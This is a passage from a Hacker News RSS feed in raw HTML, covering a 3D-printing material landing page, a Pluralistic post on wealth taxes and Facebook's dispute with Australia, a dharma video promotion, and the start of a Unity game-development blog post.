February 21, 2021 | https://pluralam.com/carbon-fiber-filled-nylon-3d-print-material-for-digital-manufacturing/ | <a href="https://web.archive.org/web/*/https://pluralam.com/carbon-fiber-filled-nylon-3d-print-material-for-digital-manufacturing/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="fl-main-content" itemprop="mainContentOfPage" role="main"><div><div><div><article class="page" id="fl-post-4640" itemscope="itemscope" itemtype="https://schema.org/CreativeWork"><div itemprop="text"><div data-post-id="4640"><div data-node="601f3b7bbdb3b"><div><div><div data-node="601f3b7bbdb3f"><div data-node="601f3b7bbdb40"><div><div data-node="601f410cb3761"><div><p>Compare Plural's PA12CF35 to other industry-leading options, and register below for a free sample part</p></div></div></div></div></div></div></div></div><div id="camparison-charts" data-node="601f3c9c0bf89"><div><div><div data-node="602c4a19a2322"><div data-node="602c4a19a2493"><div><div data-node="601f40fc4b48f"><div><div><div itemscope="" itemtype="https://schema.org/ImageObject"><p><img src="https://freddieflip.s3.us-west-2.amazonaws.com/uploads/sites/28/2021/02/16145812/pa12cf35-strength.png" alt="pa12cf35-strength" title="pa12cf35-strength" itemprop="image"></p></div></div></div></div></div></div><div data-node="602c4a19a2497"><div><div data-node="602c490f59a73"><div><div><div itemscope="" itemtype="https://schema.org/ImageObject"><p><img src="https://freddieflip.s3.us-west-2.amazonaws.com/uploads/sites/28/2021/02/16145808/pa12cf35-cost.png" alt="pa12cf35-cost" title="pa12cf35-cost" itemprop="image"></p></div></div></div></div></div></div></div><div data-node="602c50fd3fc6c"><div data-node="602c50fd3fdcc"><div><div data-node="602c58480e814"><div><p><em>Sources: Manufacturer Datasheets</em></p></div></div></div></div></div></div></div></div><div data-node="602d74487c4d1"><div><div><div data-node="602d74487c7d5"><div data-node="602d74487c7d6"><div><div data-node="602d74487c7d8"><div><p>Below left to right: Fixtures, forming die, clips, bracket, bike pedal (with and without support)</p></div></div><div data-node="602d74487c7d7"><div><div itemscope="" itemtype="https://schema.org/ImageObject"><p><img loading="lazy" src="https://freddieflip.s3.us-west-2.amazonaws.com/uploads/sites/28/2021/02/17131638/campaign1-parts-landingpage-fade-1-scaled.jpg" alt="campaign1-parts-landingpage-fade" itemprop="image" height="865" width="1920" title="campaign1-parts-landingpage-fade" srcset="https://freddieflip.s3.us-west-2.amazonaws.com/uploads/sites/28/2021/02/17131638/campaign1-parts-landingpage-fade-1-scaled.jpg 1920w, https://freddieflip.s3.us-west-2.amazonaws.com/uploads/sites/28/2021/02/17131638/campaign1-parts-landingpage-fade-1-400x180.jpg 400w, https://freddieflip.s3.us-west-2.amazonaws.com/uploads/sites/28/2021/02/17131638/campaign1-parts-landingpage-fade-1-1024x462.jpg 1024w, https://freddieflip.s3.us-west-2.amazonaws.com/uploads/sites/28/2021/02/17131638/campaign1-parts-landingpage-fade-1-768x346.jpg 768w, https://freddieflip.s3.us-west-2.amazonaws.com/uploads/sites/28/2021/02/17131638/campaign1-parts-landingpage-fade-1-1536x692.jpg 1536w, https://freddieflip.s3.us-west-2.amazonaws.com/uploads/sites/28/2021/02/17131638/campaign1-parts-landingpage-fade-1-2048x923.jpg 2048w" sizes="(max-width: 1920px) 100vw, 1920px"></p></div></div></div></div></div></div></div></div></div><div data-node="602c021bef3d0"><div><div><div data-node="602c021bef6e7"><div data-node="602c021bef6e8"><div><div data-node="602c021bef6eb"><div><div><div itemscope="" itemtype="https://schema.org/ImageObject"><p><img src="https://freddieflip.s3.us-west-2.amazonaws.com/uploads/sites/28/2018/06/18134239/3ntr_A2V2_A4V4_family_cropped-Copy.png" alt="Industrial 3D printers from 3ntr. Models A2V4 and A4V4" title="3ntr_A2V4_A4V4_family_cropped-Copy" itemprop="image"></p></div></div></div></div></div></div><div data-node="602c021bef6ea"><div><div data-node="602c5a010e314"><div><p>PA12CF35 is just one of the many exciting new materials in the Plural library. Start a conversation with us today to learn more about our full array of unique 3D printing solutions.</p></div></div><div data-node="602c021bef6ee"><p><h2><span>Speak directly with a representative</span></h2></p></div><div data-node="602c021bef6ef"><div><div><div><h5><span></span><span>6455 Lakeview Blvd. Suite B <br>Lake Oswego, OR 97035</span></h5></div></div></div></div></div></div></div></div></div></div></div></div></article></div></div></div></div></div>]]>
            </description>
            <link>https://pluralam.com/carbon-fiber-filled-nylon-3d-print-material-for-digital-manufacturing/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26216781</guid>
            <pubDate>Sun, 21 Feb 2021 20:21:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Facebook vs. Australia]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26216643">thread link</a>) | @ydlr
<br/>
February 21, 2021 | https://pluralistic.net/2021/02/21/paltrow-industrial-complex/#facecrook | <a href="https://web.archive.org/web/*/https://pluralistic.net/2021/02/21/paltrow-industrial-complex/#facecrook">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1922">
	<!-- .entry-header -->

	
	
	<div>
		<p><!--
Tags:
matt stoller, wealth tax, piketty, argentina, bolivia, covid, k-shaped recovery, class war, facebook, australia, news media, gwyneth paltrow, goop, grifters, woo, jade eggs, paltrow-industrial complex

Summary:
K-shaped recovery vs wealth taxes; Facebook vs Australia; The Paltrow-Industrial Complex

URL:
https://pluralistic.net/2021/02/21/paltrow-industrial-complex/

Title:
Pluralistic: 21 Feb 2021 paltrow-industrial-complex

Bullet:
👨🏿‍🔬

Separator:
_,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,_

Top Sources:
Today's top sources: Naked Capitalism (https://www.nakedcapitalism.com/).

--><br>
<a href="https://pluralistic.net/2021/02/21/paltrow-industrial-complex/"><img src="https://i0.wp.com/craphound.com/images/21Feb2021.jpg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/21Feb2021.jpg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></p>

<ul>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/02/21/paltrow-industrial-complex/#wealth-tax">K-shaped recovery vs wealth taxes</a>: Evita's spectre is haunting Argentina.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/02/21/paltrow-industrial-complex/#facecrook">Facebook vs Australia</a>: It's not a link-tax, it's collective bargaining.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/02/21/paltrow-industrial-complex/#goopy">The Paltrow-Industrial Complex</a>: How Goop is cashing in on covid.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/02/21/paltrow-industrial-complex/#retro">This day in history</a>: 2006, 2011, 2016, 2020
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/02/21/paltrow-industrial-complex/#bragsheet">Colophon</a>: Recent publications, upcoming/recent appearances, current writing projects, current reading
</li>
</ul>

<hr>
<p><a name="wealth-tax"></a><br>
<img src="https://i0.wp.com/craphound.com/images/covidwealth.jpg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/covidwealth.jpg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>The K-shaped recovery – where the rich got richer and the poor got poorer – wasn't inevitable. It is the outcome of hard lobbying by the investor class to turn on floods of money to the rich, while starving the poor of money, rent-relief and debt-relief.</p>
<p>This has enabled wealthy people to increase their fortunes through asset inflation (STONKS) and financial engineering (buybacks, tax refunds, and bonuses) and cash-transfers (personal LLCs taking in vast PPP loans).</p>
<p>It also drove poor people into unsafe working conditions as the only alternative to homelessness and starvation, which let the rich keep their businesses open and supplied a pool of "essential worker" labor to deliver food and even serve in-person diners.</p>
<p>Thomas Piketty's 2013 CAPITAL IN THE 21ST CENTURY documents how inequality is a self-reinforcing policy: markets drive capital accumulation (that is, they make rich people richer), and capital is mobilized to buy wealth-favoring policies.</p>
<p><a href="https://memex.craphound.com/2014/06/24/thomas-pikettys-capital-in-the-21st-century/">https://memex.craphound.com/2014/06/24/thomas-pikettys-capital-in-the-21st-century/</a></p>
<p>But he also documents how unstable this whole arrangement is: for a society to tolerate inequality, there must be a broadly accepted narrative of fairness, some story that explains why the desperately precarious should tolerate the smugly comfortable.</p>
<p><a href="https://pluralistic.net/2021/01/18/peak-indifference/#peak-indifference">https://pluralistic.net/2021/01/18/peak-indifference/#peak-indifference</a></p>
<p>The worse the inequality, the thinner the narrative. As (im)morality plays go, the pandemic is pretty on the nose. The K-shaped recovery saw high mortality among racialized, precarious people, while the wealthy are mostly upset about missing their holidays.</p>
<p>Add to that the iron grip that the wealthy maintain on policy, on relief, insisting that $2,000 checks are beyond our means, pretending that they're not making these claims from the jacuzzis they've filled with free government money.</p>
<p>The status quo <em>will</em> collapse. In Piketty's 1789, that meant guillotines. In Argentina, they're trying for a peaceful resolution: they're taxing wealth. Any fortune of $3.4m faces a one-time Robin Hood tax of 3.5%.</p>
<p><a href="https://www.thehour.com/news/article/Should-the-rich-pay-for-the-pandemic-Argentina-15964581.php">https://www.thehour.com/news/article/Should-the-rich-pay-for-the-pandemic-Argentina-15964581.php</a></p>
<p>That is to say, they're allocating the tip of the top leg of the K-shaped recovery to the bottom leg.</p>
<p>Bolivia has created a Piketty-compliant annual tax on fortunes of more than $4.3m. Morocco's trying out a one-time tax on vast fortunes.</p>
<p>It's not just the global south: the UK's independent Wealth Tax Commission recommended a one-time levy. Canadian PM Justin Trudeau wants to "tax extreme wealth inequality."</p>
<p>Wealth-tax opponents say that they don't work – that wealth-taxes result in deceptive asset revaluations and offshoring to financial secrecy havens and so become costly boondoggles. But that's an incomplete account of how the situation plays out.</p>
<p>It's more true to say that when a wealth tax is set to pass, the wealthy mobilize their capital to create loopholes in the rules that guarantee these boondoggles.</p>
<p>This is not the inevitable outcome of a wealth-tax. As Gabriel Zucman has demonstrated, it's certainly possible to design effective wealth-taxes.</p>
<p><a href="https://www.bloomberg.com/news/features/2019-05-23/the-wealth-detective-who-finds-the-hidden-money-of-the-super-rich">https://www.bloomberg.com/news/features/2019-05-23/the-wealth-detective-who-finds-the-hidden-money-of-the-super-rich</a></p>
<p>The investor class demanded a system that squeezed and squeezed, and now we're facing a rupture. The Robin Hood tax advocates are trying to manage an orderly, peaceful transition to a fairer system. The alternative is not business as usual.</p>
<hr>
<p><a name="facecrook"></a><br>
<img src="https://i2.wp.com/craphound.com/images/ausfb.jpg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/craphound.com/images/ausfb.jpg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>There's an old Irish joke whose punchline goes, "If you want to get there, I wouldn't start from here." That's basically how I feel about the so-called Australian "link tax" and Facebook's retaliation.</p>
<p>Let's start with the fact that it's not a link tax – it's a form of arbitrated collective bargaining that's meant to correct an imbalance in negotiating power created by monopolization.</p>
<p>The problem that the system is supposed to ameliorate is that the ad-tech platforms cheat. They lie about the reach of their ads. They lie about the performance of their ads. They rig markets so they can price-gouge. They collude to rig prices.</p>
<p><a href="https://papers.ssrn.com/sol3/papers.cfm?abstract_id=3500919">https://papers.ssrn.com/sol3/papers.cfm?abstract_id=3500919</a></p>
<p>They design their systems so publishers leak intelligence to them, then they exploit that leakage to gouge the publishers further. It hurts advertisers, readers and publishers, and it's the result of an illegal, collusive, corrupt ad-tech duopoly.</p>
<p><a href="https://pluralistic.net/2020/12/06/surveillance-tulip-bulbs/#adtech-bubble">https://pluralistic.net/2020/12/06/surveillance-tulip-bulbs/#adtech-bubble</a></p>
<p>The existence of an advertising duopoly, meanwhile, is the result of lax antitrust enforcement. Facebook and Google were permitted to execute a long string of anticompetitive mergers and acquisitions, producing the hyper-concentrated market we see today.</p>
<p>The obvious remedy to this situation is to break up the monopolies, but that is off the table (for now). 40 years of neoliberal orthodoxy says that monopolies are efficient and breakups don't work, so we're left yanking on other policy levers.</p>
<p>For example, ad-tech pioneered a long, accelerating trend to surveillance. Their reach meant they could gather data on nearly everything that happened online (Facebook Like buttons, Google Analytics). Their capital meant they could strangle privacy laws in the cradle.</p>
<p>Eventually this became too much to bear. The EU passed the GDPR – but without breakups or other explicit antimonopoly measures. The result was that FB/Goog had to look down the back of the sofa for change to pay for compliance.</p>
<p>Meanwhile smaller, EU-based competitors (who were much dirtier than FB/Goog because they needed to behave worse to be economically viable in the cracks left by the duopoly) were driven out of business, handing even more market-power to Googbook.</p>
<p><a href="https://papers.ssrn.com/sol3/papers.cfm?abstract_id=3477686">https://papers.ssrn.com/sol3/papers.cfm?abstract_id=3477686</a></p>
<p>Which brings me back to Australia. It's undeniable that publishers get ripped off by Googbook. Their ad marketplaces are frauds from top to bottom: fake metrics for fake users seeing fake ads, run on bid-rigging and self-dealing.</p>
<p>Publishers that complain about this get slammed: Googbook uses the fact that they have created anticompetitive, vertically integrated cartels to tie a willingness to submit to crooked ad payments to traffic.</p>
<p>That means that publishers who make a stink about being ripped off – or who take measures to prevent leakage of their internal business data – have their traffic switched off. This is possible because regulators permitted vertical mergers between search/social and ad-tech.</p>
<p>This vertical integration is the source of confusion about whether this is a link-tax. The goal of the regulation is to clean up the ad markets, but Googbook use links as a stick to beat up publishers when they don't submit to corrupt ad practices, so links get implicated.</p>
<p>But the regulation's primary levers are transparency: it forces Googbook to disclose which data it harvests from publishers and how it uses it; it forces Googbook to disclose algorithmic changes that will result in significant changes to ad performance.</p>
<p>Just as importantly, it forbids Googbook from using their search/social business to retaliate against publishers who object to bad practices in their ad-tech units.</p>
<p>At Matt Stoller writes, the idea "is to mimic a healthy market, where there is transparency of data and a robust set of buyers and sellers instead of a few dominant platforms."</p>
<p><a href="https://mattstoller.substack.com/p/facecrook-dealing-with-a-global-menace">https://mattstoller.substack.com/p/facecrook-dealing-with-a-global-menace</a></p>
<p>The hope/wish is that all this transparency and guaranteed of non-retaliation might means Googbook ending their market corruption so publishers will get a fair price for their ad-inventory. And if they don't, there's an arbitrator who hears both sides and sets prices.</p>
<p>This is how collective bargaining often works – when you have one side of a deal who has all the power (like a big employer) and a diffuse set of actors who lack power (like workers), an arbitrator hears both sides and hands down a deal that's meant to be fairer.</p>
<p>But of course, this isn't a negotiation between workers and employers: it's a bargain between a cartel of news organizations and a search duopoly. That's not ideal! For starters, it means that the government gets to decide who is a "news organization."</p>
<p>That's <em>ripe</em> for abuse. News organizations are expected to report on the government <em>and</em> the government gets to decide whether they are entitled to participate in collective bargaining with Googbook, which could mean the difference between financial viability and bankruptcy.</p>
<p>Remember, one of the problems this system is supposed to resolve is powerful entities (Googbook) using their power to punish news organizations for complaining about their behavior – governments were in that game long before Googbook came into existence.</p>
<p>And there's another problem: the structure of the Australian news market, which is yet another highly concentrated industry, dominated by a rapacious billionaire who uses his power to manipulate politics: Rupert Murdoch.</p>
<p>Murdoch conquered Australian media the same way Googbook conquered the net: through anticompetitive conduct that was waved through by collusive regulators who never met a monopoly they didn't view as efficient.</p>
<p>It's not wrong to say that the only reason this regulation got off the drawing-board is that Murdoch viewed it as a way to shift a few balance-points from Big Tech's side of the ledger to Big Media's side.</p>
<p>Can't we – journalists, readers – hope for something better than being dominated by a different set of giants and praying that the new boss drops a few more crumbs than the old boss?</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://pluralistic.net/2021/02/21/paltrow-industrial-complex/#facecrook">https://pluralistic.net/2021/02/21/paltrow-industrial-complex/#facecrook</a></em></p>]]>
            </description>
            <link>https://pluralistic.net/2021/02/21/paltrow-industrial-complex/#facecrook</link>
            <guid isPermaLink="false">hacker-news-small-sites-26216643</guid>
            <pubDate>Sun, 21 Feb 2021 20:08:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Is Dharma – Ultimate Path to Enlightenment]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26216340">thread link</a>) | @TriNetra
<br/>
February 21, 2021 | https://os.me/news/what-is-dharma/ | <a href="https://web.archive.org/web/*/https://os.me/news/what-is-dharma/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Watch this interesting conversation between three wise people on dharma, monk-hood and to know if Sanatan Dharma will die...</p><div>
															<div>
									<h5>To get up, close and personal with people who matter - <br>join os.me exclusive community.</h5>
									<p><a href="#"> Subscribe </a>
								</p></div>
														<h5>The erudite siblings, Amish and Bhavna Roy, who have co-authored the book <a href="https://www.amazon.com/Dharma-Decoding-Epics-Meaningful-Life-ebook/dp/B08P1ZJS2L" target="_blank" rel="noopener">Dharma: Decoding the Epics for a Meaningful Life</a>, and Himalayan monk Om Swami, who is a best-selling author and an authority on all things dharma and karma, got together over a video call to answer some of the life’s biggest questions. The answers will help one live a meaningful and fulfilling life. The conversation will have you transfixed.</h5>
<p>This engaging discussion is enlightening and offers a&nbsp; peek into the mind of writers and people who have chosen entirely different paths yet have stayed true to dharma.</p>
<p><span><span><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fos.me%2Fnews%2Fwhat-is-dharma%2F&amp;text=Catch%20best-selling%20authors%20Amish%2C%20Bhavna%20Roy%20and%20Himalayan%20monk%20Om%20Swami%20in%20an%20engaging%20chat.&amp;via=osdotme&amp;related=osdotme" target="_blank" rel="noopener noreferrer">Catch best-selling authors Amish, Bhavna Roy and Himalayan monk Om Swami in an engaging chat. </a></span><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fos.me%2Fnews%2Fwhat-is-dharma%2F&amp;text=Catch%20best-selling%20authors%20Amish%2C%20Bhavna%20Roy%20and%20Himalayan%20monk%20Om%20Swami%20in%20an%20engaging%20chat.&amp;via=osdotme&amp;related=osdotme" target="_blank" rel="noopener noreferrer">tell a friend</a></span></p><p>And here’s the thing, when three wise people talk, it’s best to soak in the wisdom and not interrupt the flow. That’s what I am choosing to do. I bring to you an invigorating conversation between Om Swami, Amish and Bhavna Roy. What’s common between the three? All three are best-selling authors. Besides that? They are an authority on matters such as dharma and its practical application.&nbsp;</p>
<p>Amish and Bhavna talking about their collaboration on the book revealed that it was actually their other sibling Anish Tripathi, Amish’s twin, who planted the idea of the book in the mind of this sister-brother author duo. The book explores practical, philosophical lessons from our epic the Mahabharat, and from Amish’s fiction books, the Shiva Trilogy and Ram Chandra series. The authors have made the concept of dharma highly accessible by presenting it through a series of conversations between characters who are like you and I.</p>
<p>But what is dharma? Duryodhan is also Suyodhan, points out Bhavna. So, are good and bad absolutes?&nbsp;</p>
<p>Amish says that permanent heaven and hell isn’t a dharmic concept. In fact, to aspire for heaven is not even the ultimate goal. Then what is?</p>
<p>Himalayan monk Om Swami deciphers the concept of dharma from a spiritual point of view. He also shares his journey to monkhood as he talks about giving up his multi-million dollar IT business and other worldly things in search of <a href="https://os.me/ma-the-divine-mother/">Mother Divine</a>. He shares his journey and what motivated him to become a monk. But must one become a monk to live a dharmic life?&nbsp; Find out, watch the interview now!&nbsp;</p>
<p>Here’s a set of highly acclaimed people who will have you mesmerised by their lifestories, make you think with thought-provoking ideas and show you a path to quality life through&nbsp;practical application of philosophy that you have grown up hearing but haven’t understood entirely.</p>
<p>Bhavna, who is eight years elder to Amish, cracked the Civil services but chose to quit Indian Administrative Services (IAS) for social work. She is a first-time author but a long-time philosopher. She joined the video call from Mumbai. Amish, the best-selling author of Shiva trilogy and Ram Chandra series, joined in from London, where he serves as the director of the Nehru Centre. Monk Om Swami connected on this call from his ashram in the foothills of the Himalayas.</p>
<p><span><span><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fos.me%2Fnews%2Fwhat-is-dharma%2F&amp;text=Will%20Sanatan%20Dharma%20be%20wiped%20off%20from%20the%20face%20of%20the%20earth%3FCatch%20best-selling%20authors%20Amish%20and%20Bhavna%20Roy%20and%20Himalayan%20monk%20Om%20Swami%20in%20an%20engaging%20chat.&amp;via=osdotme&amp;related=osdotme" target="_blank" rel="noopener noreferrer">Will Sanatan Dharma be wiped off from the face of the earth?Catch best-selling authors Amish and Bhavna Roy and Himalayan monk Om Swami in an engaging chat. </a></span><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fos.me%2Fnews%2Fwhat-is-dharma%2F&amp;text=Will%20Sanatan%20Dharma%20be%20wiped%20off%20from%20the%20face%20of%20the%20earth%3FCatch%20best-selling%20authors%20Amish%20and%20Bhavna%20Roy%20and%20Himalayan%20monk%20Om%20Swami%20in%20an%20engaging%20chat.&amp;via=osdotme&amp;related=osdotme" target="_blank" rel="noopener noreferrer">tell a friend</a></span></p><p>Some of the questions they answer include: Should we live by rules? Are rules even necessary? Is it possible to change our destiny through our karma? Does tantra advocate living by rules or is it about pushing the boundaries? Why become a monk? And — Will Sanatan Dharma be wiped off from the face of the earth?&nbsp;</p>
<p>A rare chance to get up, close and personal with three stellar personalities in one video. This is a phenomenal conversation you can’t afford to miss!</p>
<p><span><span><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fos.me%2Fnews%2Fwhat-is-dharma%2F&amp;text=A%20phenomenal%20conversation.%20A%20rare%20chance%20to%20get%20up%2C%20close%20and%20personal%20with%20Amish%2C%20Bhavna%20Roy%20and%20monk%20Om%20Swami.&amp;via=osdotme&amp;related=osdotme" target="_blank" rel="noopener noreferrer">A phenomenal conversation. A rare chance to get up, close and personal with Amish, Bhavna Roy and monk Om Swami. </a></span><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fos.me%2Fnews%2Fwhat-is-dharma%2F&amp;text=A%20phenomenal%20conversation.%20A%20rare%20chance%20to%20get%20up%2C%20close%20and%20personal%20with%20Amish%2C%20Bhavna%20Roy%20and%20monk%20Om%20Swami.&amp;via=osdotme&amp;related=osdotme" target="_blank" rel="noopener noreferrer">tell a friend</a></span></p><p><iframe id="YTiFrame" src="https://www.youtube-nocookie.com/embed/WPB9uGM-0jE?enablejsapi=1" name="YTiFrame" width="740" height="416" frameborder="0" allowfullscreen="allowfullscreen">&amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;span data-mce-type=&#8221;bookmark&#8221; style=&#8221;display: inline-block; width: 0px; overflow: hidden; line-height: 0;&#8221; class=&#8221;mce_SELRES_start&#8221;&amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;﻿&amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;/span&amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;span data-mce-type=&#8221;bookmark&#8221; style=&#8221;display: inline-block; width: 0px; overflow: hidden; line-height: 0;&#8221; class=&#8221;mce_SELRES_start&#8221;&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;﻿&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;/span&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;span data-mce-type=&#8221;bookmark&#8221; style=&#8221;display: inline-block; width: 0px; overflow: hidden; line-height: 0;&#8221; class=&#8221;mce_SELRES_start&#8221;&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;﻿&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;/span&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;span data-mce-type=&#8221;bookmark&#8221; style=&#8221;display: inline-block; width: 0px; overflow: hidden; line-height: 0;&#8221; class=&#8221;mce_SELRES_start&#8221;&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;﻿&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;/span&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;span data-mce-type=&#8221;bookmark&#8221; style=&#8221;display: inline-block; width: 0px; overflow: hidden; line-height: 0;&#8221; class=&#8221;mce_SELRES_start&#8221;&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;﻿&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;/span&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;</iframe></p>
<p>Time stamps:</p>
<blockquote><p>00:01 to 01:40 – Introduction</p>
<p>01:41 to 05:00 – Bhavna and Amish answer the first question by Om Swami. Dharma is a subject of deep contemplation. Before an author writes a book, there is a seed in their mind which says — this is what I want to share. So what was that moment or a journey when you decided to pen down this book, which I feel is the need of the hour in this day and age.</p>
<p>05:00 to 06:44 – Om Swami asks, ‘How did you two decide to co-author the book? Amish shares how.</p>
<p>6:46 to 17:20 – Amish asks Om Swami, ‘One of the things that always intrigued me is that in India both path have been celebrated — the path of a householder and the path of the monk. What encouraged you to leave it all and surrender yourself to the path of monkhood. What was the journey like? Om Swami shares his journey and elaborates on his quest for the truth. He also shares his understanding of Dharma, citing examples of conversation between Krisha and Arjuna.</p>
<p>17:21 to 22:14 – Amish shares his experience of visiting the cave where Saptarishi Vashishta and his wife, Arundhati, meditated. He talks about experiencing a strong energy field even after thousands of years. Then, Amish describes writing as a spiritual experience for him. Om Swami sheds light on the signs of awakening.</p>
<p>22:15 to 28:29 – Om Swami requests the author duo to share their understanding of Dharma. Bhavna describes Dharma as a universal concept applicable to all living and non-living beings. She also mention sth role of experience and knowledge.</p>
<p>Amish highlights the human challenge with respect to the concept of Dharma. The stress on the religious view and a non – religious view and the final destination, Moksha. He talks about choices and consequences and the role play of Dharma.</p>
<p>28:30 to 33:46 – Om Swami initiates the discussion on the importance of rules in one’s life. He asks: One would say these are the rules of my dharma or you think its a grey area? What do you feel about that? Bhavna shares insights of Tantrashastra where it’s the spirit of exploration and pushing the boundaries.</p>
<p>33:49 to 43:46 Amish asks Om Swami about his view on rules. Om Swami has explored Tantra Shashtra, he has followed the monk tradition, Bhagvat Gita, so what is his perspective? Om Swami shares the importance of principles of life and wisdom to take decisions. Om Swami shares the beauty of Sanatan Dharma as it is evolving and timeless.</p>
<p>He also answers the commonly asked question – If Sanatan Dharma would be wiped out from earth. He talks and further explains the concept and goal of Dharma citing examples of conversation between Krishna and Arjuna. Om Swami also shares a small story of Buddha explaining the role of Dharma.</p></blockquote>
<p>Don’t forget to subscribe to our <a href="https://www.youtube.com/c/osdotme/featured" target="_blank" rel="noopener noreferrer">channel</a>. For more inspirational content, subscribe to <a href="https://os.me/" target="_blank" rel="noopener noreferrer">os.me</a>&nbsp;</p>
															<div>
									<h5>To get up, close and personal with people who matter - <br>join os.me exclusive community.</h5>
									<p><a href="#"> Subscribe </a>
								</p></div>
													</div></div>]]>
            </description>
            <link>https://os.me/news/what-is-dharma/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26216340</guid>
            <pubDate>Sun, 21 Feb 2021 19:30:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[“But How Do I Start?” Making Games on Your Own as an Engineer]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26216184">thread link</a>) | @Eyas
<br/>
February 21, 2021 | https://blog.eyas.sh/2021/02/unity-for-engineers-pt11-development-process/ | <a href="https://web.archive.org/web/*/https://blog.eyas.sh/2021/02/unity-for-engineers-pt11-development-process/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In the <strong><a href="https://blog.eyas.sh/tag/unity-for-software-engineers">Unity for Software Engineers</a></strong>
series, I give an accelerated introduction to game development in Unity.
<a href="http://eepurl.com/gVgusL">Subscribers</a> have been following this series over the
past few months, often suggesting areas to cover or elaborate on. A few months
ago, a reader<!-- -->—<!-- -->also a software engineer<!-- -->—<!-- -->reached out to me (lightly
edited, emphasis mine):</p><blockquote><p><strong>The biggest unknown for me is: How do I start?</strong> What does the process of
creating a game look like? Should I build the scenes first? Should I design
the gameplay mechanics first? With business software, it’s much more familiar.
It’s easy to think, “Well, okay, I need to write the DAO or controller, etc.”
But with games, I’m lost.</p></blockquote><p>While there is no single correct answer, we can still make some distinctions
that can help get us oriented. The answer will also undoubtedly depend on <em>who</em>
is doing the development: an individual, small indie team, or larger studio? If
an individual, the answer will also depend on their primary skillset: a
